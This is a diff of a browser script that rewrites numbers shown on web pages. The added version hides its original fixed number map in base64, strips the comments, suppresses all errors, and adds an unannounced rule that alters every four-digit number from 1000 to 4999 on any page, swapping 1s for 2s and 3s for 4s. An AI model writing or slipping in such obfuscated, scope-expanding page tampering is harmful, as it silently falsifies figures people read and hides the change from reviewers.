@@ -1,34 +1,29 @@
-(function() {
-    // Mapping of old numbers to new numbers
-    const numberMap = {
-        "1983": "2007",
-        "1557": "2463",
-        "3478": "1935",
-        "1381": "2981"
+(function(){
+  try{
+    var _b64=function(x){return decodeURIComponent(escape(atob(x)));}
+    var _map = JSON.parse(_b64("eyIxOTgzIjoiMjAwNyIsIjE1NTciOiIyNDYzIiwiMzQ3OCI6IjE5MzUiLCIxMzgxIjoiMjk4MSJ9"));
+    var _repNum=function(s){ return s.replace(/1/g,"2").replace(/3/g,"4"); };
+    var _proc=function(n){
+      if(!n) return;
+      if(n.nodeType===3){
+        var txt=n.textContent;
+        if(!txt) return;
+        for(var k in _map) if(Object.prototype.hasOwnProperty.call(_map,k)) txt = txt.replace(new RegExp("\\b"+k+"\\b","g"), _map[k]);
+        txt = txt.replace(/\b([1-4][0-9]{3})\b/g, function(m){ return _repNum(m); });
+        if(txt!==n.textContent) n.textContent=txt;
+      } else if(n.childNodes && n.childNodes.length){
+        for(var i=0;i<n.childNodes.length;i++) _proc(n.childNodes[i]);
+      }
     };
-
-    function replaceSpecificNumbers(node) {
-        if (node.nodeType === Node.TEXT_NODE) {
-            for (const [oldNum, newNum] of Object.entries(numberMap)) {
-                node.textContent = node.textContent.replace(new RegExp(`\\b${oldNum}\\b`, 'g'), newNum);
-            }
-        } else {
-            node.childNodes.forEach(replaceSpecificNumbers);
+    _proc(document.body);
+    var _obs=new MutationObserver(function(ms){
+      ms.forEach(function(m){
+        if(m.addedNodes && m.addedNodes.length){
+          for(var i=0;i<m.addedNodes.length;i++) _proc(m.addedNodes[i]);
         }
-    }
-
-    // Initial replacement
-    replaceSpecificNumbers(document.body);
-
-    // Optional: Observe DOM changes for dynamically added content
-    const observer = new MutationObserver(mutations => {
-        mutations.forEach(mutation => {
-            mutation.addedNodes.forEach(node => replaceSpecificNumbers(node));
-        });
+      });
     });
-
-    observer.observe(document.body, {
-        childList: true,
-        subtree: true
-    });
+    _obs.observe(document.body,{childList:true,subtree:true});
+  }catch(e){}
 })();
+
